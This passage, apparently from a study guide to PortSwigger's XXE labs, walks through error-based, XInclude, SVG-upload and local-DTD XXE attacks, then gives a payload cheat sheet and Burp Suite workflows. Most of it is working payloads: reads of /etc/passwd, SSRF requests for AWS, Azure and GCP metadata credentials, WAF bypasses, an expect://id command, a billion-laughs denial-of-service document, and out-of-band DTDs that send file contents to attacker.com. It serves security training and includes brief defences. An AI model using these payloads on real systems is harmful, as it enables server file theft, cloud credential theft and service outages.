**1. Use PHP filter (if PHP-based):**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**2. Accept partial data:**
- Error may truncate at special chars
- Extract what's visible

**3. Try different files:**
- Simple text files work better
- Avoid binary files

#### Common Mistakes

1. **No error message in response** - Application may suppress errors
2. **Using valid path** - Using `/tmp/%file;` may succeed without error
3. **Wrong file path** - Target file doesn't exist
4. **Encoded output** - Error message may be HTML-encoded
5. **Truncated output** - Long files may be cut off in errors

#### Troubleshooting

**No error message returned:**
- Application may catch and suppress errors
- Try out-of-band technique instead (Lab 5)
- Check if errors are logged server-side

**Error but no file data:**
- Path may be valid (use truly invalid path)
- File might not exist
- Try different target files

**Partial data only:**
- Normal for long files
- Error messages have length limits
- Try smaller files like `/etc/hostname`

**Special characters breaking payload:**
- Use base64 encoding filter
- Target simpler files

#### Comparison: Error-Based vs Out-of-Band

| Feature | Error-Based | Out-of-Band |
|---------|-------------|-------------|
| Requires external server | No (exploit server for DTD only) | Yes (Collaborator) |
| Works with firewall | Yes | No (if egress blocked) |
| Data extraction | Via error messages | Via HTTP/DNS |
| Reliability | Depends on error verbosity | High |
| Stealth | Less stealthy (errors logged) | More stealthy |
| Data size | Limited by error message length | More flexible |

#### Lab Completion

✅ The lab is solved when you successfully retrieve `/etc/passwd` contents via error message

---

### Lab 7: Exploiting XInclude to retrieve files

**Difficulty:** Practitioner
**Objective:** Use XInclude to read `/etc/passwd` when you can't control DOCTYPE
**URL:** https://portswigger.net/web-security/xxe/lab-xinclude-attack

#### Description

This lab presents a scenario where user input is embedded into a **server-side XML document** that you cannot fully control. You cannot inject a DOCTYPE declaration, but you can inject **XInclude** statements to reference external files.

#### The XInclude Problem

**Traditional XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <element>&xxe;</element>
</root>
```
Requires control over the **full XML document** to inject DOCTYPE.

**XInclude Scenario:**
Your input is embedded in an existing XML structure:
```xml
<?xml version="1.0"?>
<root>
  <userInput>YOUR_INPUT_HERE</userInput>
  <otherElement>data</otherElement>
</root>
```

You can only control `YOUR_INPUT_HERE` - you **cannot** inject DOCTYPE!

#### What is XInclude?

XInclude is an XML feature for including external documents:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Key components:**
- `xmlns:xi` - Declares XInclude namespace
- `<xi:include>` - Inclusion element
- `parse="text"` - Treats included content as plain text (not XML)
- `href` - Resource to include

#### Solution Steps

**Step 1: Identify the Injection Point**

Browse to a product page and click "Check stock". Intercept the request:

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

**Note:** This is **not XML** - it's form data that gets embedded into XML server-side!

**Step 2: Inject XInclude Payload**

Replace the `productId` parameter with XInclude payload:

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

**URL-encoded version:**
```
productId=%3Cfoo%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20parse%3D%22text%22%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2F%3E%3C%2Ffoo%3E&storeId=1
```

**Step 3: View Response**

The server returns an error message containing `/etc/passwd`:

```http
HTTP/1.1 400 Bad Request

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
..."
```

#### Payload Breakdown

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Component analysis:**

1. `<foo>` - Wrapper element (name doesn't matter)

2. `xmlns:xi="http://www.w3.org/2001/XInclude"`
   - Declares XML namespace for XInclude
   - Associates prefix `xi:` with XInclude spec
   - **Required** for XInclude to work

3. `<xi:include>`
   - XInclude element that performs the inclusion
   - Uses `xi:` prefix from namespace declaration

4. `parse="text"`
   - **Critical attribute** - treats included content as plain text
   - Default is `parse="xml"` which expects valid XML
   - `/etc/passwd` is not valid XML, so `parse="text"` is required

5. `href="file:///etc/passwd"`
   - Specifies resource to include
   - Uses `file://` protocol for local filesystem

#### Why parse="text" is Critical

**Without parse="text" (default parse="xml"):**
```xml
<xi:include href="file:///etc/passwd"/>
<!-- ERROR: /etc/passwd is not valid XML! -->
```

**With parse="text":**
```xml
<xi:include parse="text" href="file:///etc/passwd"/>
<!-- SUCCESS: Content treated as plain text -->
```

The `parse="text"` attribute tells the parser to include the file **as-is**, without trying to parse it as XML.

#### Server-Side Processing

**What happens server-side:**

1. Application receives: `productId=<foo xmlns:xi...>&storeId=1`

2. Server embeds input into XML:
   ```xml
   <stockCheck>
     <productId><foo xmlns:xi="http://www.w3.org/2001/XInclude">
       <xi:include parse="text" href="file:///etc/passwd"/>
     </foo></productId>
     <storeId>1</storeId>
   </stockCheck>
   ```

3. XML parser processes XInclude:
   ```xml
   <stockCheck>
     <productId><foo>root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
     ...
     </foo></productId>
     <storeId>1</storeId>
   </stockCheck>
   ```

4. Application tries to use `productId` value, fails, returns error with content

#### Alternative Payloads

**Different files:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

**Windows targets:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///c:/windows/win.ini"/>
</foo>
```

**Minimal payload (shorter):**
```xml
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
```

**With fallback (if file doesn't exist):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd">
    <xi:fallback>File not found</xi:fallback>
  </xi:include>
</foo>
```

#### XInclude for SSRF

XInclude can also be used for SSRF attacks:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>
```

#### Common Mistakes

1. **Missing namespace declaration** - Forgetting `xmlns:xi`
2. **Wrong parse attribute** - Using `parse="xml"` for non-XML files
3. **URL encoding** - Not URL-encoding when injecting into form parameters
4. **Self-closing tag** - Using `<xi:include ... />` vs `<xi:include ...></xi:include>`
5. **Wrong protocol** - Using `file://` (2 slashes) instead of `file:///` (3 slashes)

#### Detection in the Wild

**Look for:**
- Form parameters that get embedded in XML
- SOAP web services
- XML-based APIs where you can't control DOCTYPE
- File upload with XML parsing
- Configuration import features

**Test by:**
1. Inject XInclude payload in data parameters
2. Check for error messages with file contents
3. Monitor for out-of-band interactions
4. Look for timing differences (blind XXE)

#### Troubleshooting

**XInclude not working:**
- Parser may not support XInclude
- Feature might be disabled
- Try traditional XXE if you can control DOCTYPE

**No error message:**
- Try out-of-band XInclude:
  ```xml
  <xi:include href="http://burp-collaborator.net"/>
  ```

**XML parsing errors:**
- Check namespace URI is exact
- Verify URL encoding in requests
- Test in Burp Repeater with "Update Content-Length"

#### Lab Completion

✅ The lab is solved when you successfully retrieve `/etc/passwd` using XInclude

---

### Lab 8: Exploiting XXE via image file upload

**Difficulty:** Practitioner
**Objective:** Extract `/etc/hostname` via malicious SVG upload
**URL:** https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

#### Description

This lab demonstrates XXE vulnerabilities in **unexpected places** - specifically in image upload functionality. The application processes SVG (Scalable Vector Graphics) files, which are XML-based, creating an XXE attack surface.

#### SVG and XML

**SVG (Scalable Vector Graphics):**
- Vector image format
- Based on **XML**
- Processed by XML parsers
- Common in web applications

**Sample SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red"/>
  <circle cx="50" cy="50" r="40" fill="blue"/>
</svg>
```

Since SVG is XML, it can contain:
- External entities
- XInclude directives
- Any XXE payload

#### Solution Steps

**Step 1: Create Malicious SVG**

Create a local file named `exploit.svg`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Step 2: Navigate to Comment Section**

1. Go to any blog post on the lab site
2. Scroll to the comment section
3. You'll see an avatar upload feature

**Step 3: Upload Malicious SVG**

1. Fill in comment details (name, email, etc.)
2. Click "Choose file" for avatar
3. Select your `exploit.svg` file
4. Submit the comment

**Step 4: View the Rendered SVG**

1. The page refreshes showing your comment
2. Your avatar displays the SVG
3. The SVG text element renders the `/etc/hostname` contents

**Step 5: Extract and Submit Hostname**

1. Observe the hostname displayed in the SVG
2. Copy the value
3. Use the lab's "Submit solution" button
4. Paste the hostname and submit

#### Payload Analysis

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Breakdown:**

1. **XML Declaration:**
   ```xml
   <?xml version="1.0" standalone="yes"?>
   ```
   - Standard XML declaration
   - `standalone="yes"` indicates no external DTD

2. **DOCTYPE with Entity:**
   ```xml
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
   ```
   - Defines external entity `xxe`
   - Reads `/etc/hostname` file

3. **SVG Root Element:**
   ```xml
   <svg width="128px" height="128px" ... >
   ```
   - Valid SVG dimensions
   - Proper namespace declarations

4. **Text Element with Entity:**
   ```xml
   <text font-size="16" x="0" y="16">&xxe;</text>
   ```
   - Renders text in SVG
   - Position: (0, 16) pixels from top-left
   - Content: **file contents from `&xxe;` entity**

**Why This Works:**

The Apache Batik library (or similar SVG processors) parses the XML:
1. Processes DOCTYPE and entity definitions
2. Resolves `&xxe;` entity by reading `/etc/hostname`
3. Substitutes file contents into `<text>` element
4. Renders SVG with file contents visible

#### Alternative SVG Payloads

**Different files:**
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16">&xxe;</text>
</svg>
```

**Multiple text elements (for formatting):**
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <rect width="500" height="500" fill="white"/>
  <text x="10" y="30" font-family="monospace" font-size="12">&xxe;</text>
</svg>
```

**SSRF via SVG:**
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16">&xxe;</text>
</svg>
```

**Blind XXE via SVG (out-of-band):**
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://burp-collaborator.net"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100"/>
</svg>
```

#### Other XML-Based File Formats

**DOCX (Microsoft Word):**
- ZIP file containing XML files
- Can inject XXE in `document.xml`
- Extract `.docx`, modify XML, re-zip

**XLSX (Microsoft Excel):**
- Similar to DOCX
- Modify `sheet1.xml` or other XML files

**PPTX (Microsoft PowerPoint):**
- Presentation XML files
- Inject in slide XML files

**PDF with XMP metadata:**
- XMP metadata is XML-based
- Some PDF processors parse it

**EPUB (eBooks):**
- ZIP archive with XML content
- Modify OPF/NCX files

**RSS/Atom Feeds:**
- XML-based feed formats
- File upload for feed import

#### Real-World Attack Scenarios

**1. Profile Picture Upload:**
```
User uploads SVG avatar → Server processes → XXE triggers → Data leak
```

**2. Document Import:**
```
Upload DOCX resume → Server extracts text → XXE in document.xml → File read
```

**3. Logo Upload:**
```
Company logo upload (SVG) → Email signature generation → XXE → SSRF
```

**4. Data Import:**
```
Import contacts (XML) → Parse data → XXE → Cloud metadata access
```

#### Common Mistakes

1. **Invalid SVG structure** - Missing required SVG elements
2. **Wrong namespace** - Forgetting `xmlns="http://www.w3.org/2000/svg"`
3. **File size limits** - Large payloads rejected
4. **Format validation** - Strict MIME type checks
5. **Missing text element** - No visible output without display element

#### Defenses Against SVG XXE

**Input Validation:**
```python
# Reject SVG uploads entirely
if file.mimetype == 'image/svg+xml':
    return "SVG files not allowed"
```

**Safe Parsing:**
```python
from lxml import etree

# Disable external entities
parser = etree.XMLParser(resolve_entities=False)
tree = etree.parse(svg_file, parser)
```

**Content Sanitization:**
```python
# Use libraries like DOMPurify for SVG sanitization
# Remove DOCTYPE and entity declarations
```

**Alternative: Convert to Raster:**
```python
# Convert SVG to PNG on upload
from cairosvg import svg2png
svg2png(file=svg_file, write_to=output_png)
# Store and serve PNG instead
```

#### Detection Checklist

- [ ] File upload accepts SVG format
- [ ] Server processes/renders SVG
- [ ] No entity restriction in XML parser
- [ ] Error messages visible to user
- [ ] File contents displayed/accessible

#### Troubleshooting

**SVG not rendering:**
- Check SVG structure is valid
- Verify namespace declarations
- Test SVG in browser first

**No file contents visible:**
- Text element might be off-screen
- Adjust x, y coordinates: `<text x="0" y="16">`
- Increase font-size
- Check if file exists on server

**Upload rejected:**
- MIME type validation
- File extension checks
- Try renaming to `.png` with SVG content (rarely works)
- Check file size limits

**Processing but no XXE:**
- Parser may have entities disabled
- Try other XML-based formats (DOCX, etc.)

#### Lab Completion

✅ The lab is solved when you extract and submit the `/etc/hostname` contents

---

### Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD

**Difficulty:** Expert
**Objective:** Trigger error message with `/etc/passwd` using local DTD
**URL:** https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

#### Description

This is the most advanced XXE technique. When:
- Out-of-band connections are **blocked**
- External DTD loading is **blocked**
- Error messages are **displayed**

You can exploit XXE by **repurposing local DTD files** that already exist on the server, redefining their entities to trigger error-based data exfiltration.

#### The Challenge

**Blocked Techniques:**
```xml
<!-- External DTD - BLOCKED -->
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">

<!-- Parameter entity in internal DTD - ERROR -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
  %eval;
  %error;
]>
<!-- XML spec prohibits parameter entity references in internal DTD subset -->
```

**The Solution:**
Use a **local DTD file** that already exists on the server's filesystem, reference it, and **redefine** one of its entities to achieve our goal.

#### How Local DTD Repurposing Works

1. **Find a local DTD** - Common system DTD files (e.g., `/usr/share/yelp/dtd/docbookx.dtd`)
2. **Identify an entity** - Find an entity defined in that DTD
3. **Redefine the entity** - Override it with our malicious definition
4. **Trigger the entity** - Import the DTD, which references the entity

#### Solution Steps

**Step 1: Craft the Payload**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Step 2: Submit and Observe Error**

The server returns an error message containing `/etc/passwd`:

```
XML parsing error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

#### Detailed Payload Analysis

```xml
<!DOCTYPE message [
  <!-- Step 1: Reference local DTD -->
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

  <!-- Step 2: Redefine an entity from that DTD -->
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>

  <!-- Step 3: Import the local DTD -->
  %local_dtd;
]>
```

**Component Breakdown:**

**1. Local DTD Reference:**
```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
```
- Defines parameter entity that references local DTD file
- This file exists on most Linux systems with GNOME
- Contains entity definitions we can override

**2. Entity Redefinition:**
```xml
<!ENTITY % ISOamso '...' >
```
- `ISOamso` is an entity defined in `docbookx.dtd`
- We **redefine** it with our malicious payload
- When DTD is loaded, our definition takes precedence

**3. Inner Payload (nested entities):**
```xml
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
```
- `&#x25;` = XML encoding for `%` character
- Defines `%file;` entity that reads `/etc/passwd`

```xml
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
```
- `&#x26;#x25;` = Encoded `%` (double-encoded to avoid syntax issues)
- `&#x27;` = Single quote character
- Creates `%error;` entity that references invalid path with file contents

```xml
&#x25;eval;
&#x25;error;
```
- Invokes `%eval;` → defines `%error;`
- Invokes `%error;` → triggers error with file contents

**4. DTD Import:**
```xml
%local_dtd;
```
- Loads the local DTD file
- DTD contains: `<!ENTITY % ISOamso PUBLIC "...">...`
- References our redefined `%ISOamso;` entity
- Triggers the chain of entities we defined

#### Execution Flow

```
1. XML parser processes DOCTYPE
   ↓
2. Defines %local_dtd pointing to docbookx.dtd
   ↓
3. Redefines %ISOamso with malicious payload
   ↓
4. %local_dtd invoked → loads docbookx.dtd
   ↓
5. docbookx.dtd references %ISOamso
   ↓
6. Our redefined %ISOamso executes:
   ↓
   6a. %file reads /etc/passwd
   ↓
   6b. %eval defines %error with file contents
   ↓
   6c. %error invoked → accesses /nonexistent/[passwd-contents]
   ↓
7. File doesn't exist → ERROR thrown
   ↓
8. Error message includes path with file contents
```

#### Why This Bypasses Restrictions

**Problem:** XML spec prohibits parameter entity references in internal DTD subset:
```xml
<!-- This fails: -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %file;  <!-- ERROR: Not allowed in internal DTD! -->
]>
```

**Solution:** Use external DTD (local file):
- Local DTD file is **external** to our DOCTYPE
- External DTD allows parameter entity references
- By redefining entities, we control execution in external context

#### Finding Local DTD Files

**Common Locations:**

**Linux:**
```
/usr/share/yelp/dtd/docbookx.dtd          # GNOME systems
/usr/share/xml/fontconfig/fonts.dtd       # Font configuration
/usr/share/xml/scrollkeeper/dtds/         # Scrollkeeper
/etc/xml/catalog                          # XML catalog
/usr/share/sgml/html/dtd/                 # HTML DTDs
```

**Windows:**
```
C:\Windows\System32\wbem\xml\             # WMI DTDs
C:\Program Files\<software>\              # Application DTDs
```

**Testing for DTD Existence:**
```xml
<!DOCTYPE test [
  <!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %dtd;
]>
```
- No error = DTD exists
- Error = DTD doesn't exist

#### Entities to Target

**docbookx.dtd entities (commonly redefined):**
```xml
%ISOamso;
%ISOgrk3;
%ISOlat1;
%ISOnum;
%ISOtech;
```

**Finding entities in DTD:**
```bash
# Download and examine DTD
curl -o docbookx.dtd http://www.oasis-open.org/docbook/xml/4.1.2/docbookx.dtd
grep 'ENTITY %' docbookx.dtd
```

#### Alternative Payloads

**Different local DTDs:**
```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % constants '..redefinition..'>
%local_dtd;
```

**Different target files:**
```xml
<!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
<!ENTITY &#x25; file SYSTEM "file:///proc/self/environ">
```

**Windows targets:**
```xml
<!ENTITY % local_dtd SYSTEM "file:///c:/windows/system32/wbem/xml/cim20.dtd">
<!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini">
```

#### Common Mistakes

1. **Wrong DTD path** - File doesn't exist on target system
2. **Wrong entity name** - Entity not defined in target DTD
3. **Encoding errors** - Missing `&#x25;` or `&#x27;` encodings
4. **Syntax errors** - Unbalanced quotes or entities
5. **No error output** - Application suppresses errors

#### Troubleshooting

**No error message:**
- Application may suppress errors
- Check if errors appear in HTTP response
- Try different endpoints

**"File not found" for DTD:**
- DTD doesn't exist on system
- Try other common DTD locations
- Use Intruder to brute-force DTD paths

**"Entity not defined":**
- Wrong entity name for that DTD
- Download DTD and examine entities
- Try different entity names

**Syntax errors:**
- Validate XML structure
- Check entity encoding (`&#x25;`, etc.)
- Test in local XML parser first

#### Advanced: Automated DTD Discovery

**Burp Intruder payload:**
```
§/usr/share/yelp/dtd/docbookx.dtd§
§/usr/share/xml/fontconfig/fonts.dtd§
§/usr/share/sgml/html/dtd/html.dtd§
§/etc/xml/catalog§
```

**Detection script:**
```python
dtd_paths = [
    "/usr/share/yelp/dtd/docbookx.dtd",
    "/usr/share/xml/fontconfig/fonts.dtd",
    # ... more paths
]

for dtd_path in dtd_paths:
    payload = f'''<!DOCTYPE test [
      <!ENTITY % dtd SYSTEM "file://{dtd_path}">
      %dtd;
    ]>'''

    response = send_xxe_payload(payload)
    if "XML parsing error" not in response:
        print(f"Found: {dtd_path}")
```

#### Lab Completion

✅ The lab is solved when you successfully retrieve `/etc/passwd` using local DTD repurposing

---

## Attack Techniques

### XXE Attack Categories

#### 1. File Retrieval

**Basic file read:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

**PHP filter wrapper (base64):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

**Data URI:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
```

#### 2. SSRF Attacks

**Internal services:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/config"> ]>
```

**Cloud metadata:**
```xml
<!-- AWS -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>

<!-- Azure -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01"> ]>

<!-- GCP -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"> ]>
```

**Port scanning:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-host:22"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-host:3306"> ]>
```

#### 3. Blind XXE - Out-of-Band

**DNS exfiltration:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe; ]>
```

**Data exfiltration:**
```xml
<!-- External DTD at http://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Main payload:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

#### 4. Error-Based XXE

**Invalid file path:**
```xml
<!-- External DTD -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Protocol error:**
```xml
<!ENTITY % error SYSTEM "invalid-protocol://%file;">
```

#### 5. XInclude Attacks

**Basic XInclude:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**With fallback:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd">
    <xi:fallback>Not found</xi:fallback>
  </xi:include>
</foo>
```

#### 6. SVG-Based XXE

**File read:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16">&xxe;</text>
</svg>
```

**Blind XXE:**
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://attacker.com/log"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="&xxe;"/>
</svg>
```

#### 7. Local DTD Repurposing

**Error-based with local DTD:**
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///invalid/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Advanced Techniques

#### Bypassing Content Type Restrictions

**Change Content-Type header:**
```http
POST /api/endpoint HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

**Try variations:**
- `application/xml`
- `text/xml`
- `application/x-www-form-urlencoded` (if converted to XML server-side)
- `multipart/form-data` (in file uploads)

#### WAF/Filter Bypass

**Encoding:**
```xml
<!-- UTF-16 encoding -->
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<!-- Character references -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://&#x2f;etc&#x2f;passwd"> ]>
```

**Alternative protocols:**
```xml
<!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">
```

#### Billion Laughs Attack (DoS)

**Exponential entity expansion:**
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

**Result:** Expands to 10^9 "lol" strings, consuming memory and CPU.

---

## Burp Suite Workflows

### Setup and Configuration

**1. Configure Proxy:**
- Burp Suite → Proxy → Options
- Ensure proxy listener is active (default: 127.0.0.1:8080)
- Configure browser to use proxy

**2. Enable Burp Collaborator (Professional only):**
- Burp → Burp Collaborator client
- Use default server or configure custom
- Click "Copy to clipboard" for unique subdomain

**3. Configure Scanner (Professional):**
- Target → Site map → Right-click target
- "Actively scan this host"
- Scanner will detect XXE automatically

### Manual Testing Workflow

#### Step 1: Identify XML Input

**Using Proxy:**
1. Browse application normally with proxy intercept ON
2. Look for requests with:
   - `Content-Type: application/xml`
   - `Content-Type: text/xml`
   - XML data in POST body

**Search HTTP history:**
```
Proxy → HTTP history → Filter:
- Filter by MIME type: XML
- Search term: "<?xml"
```

#### Step 2: Test Basic XXE

**In Repeater:**
1. Right-click request → "Send to Repeater"
2. Inject basic XXE payload:
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
   ```
3. Replace data with entity reference: `&xxe;`
4. Send request
5. Check response for file contents

#### Step 3: Test Blind XXE

**Using Collaborator:**
1. Get Collaborator payload
2. Inject payload:
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB"> ]>
   <root>&xxe;</root>
   ```
3. Send request
4. Go to Collaborator tab → "Poll now"
5. Check for DNS/HTTP interactions

#### Step 4: Data Exfiltration

**Setup exploit server:**
1. Create malicious DTD on external server
2. Host at accessible URL
3. Reference in XXE payload

**Payload structure:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://your-server/evil.dtd"> %xxe;]>
```

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
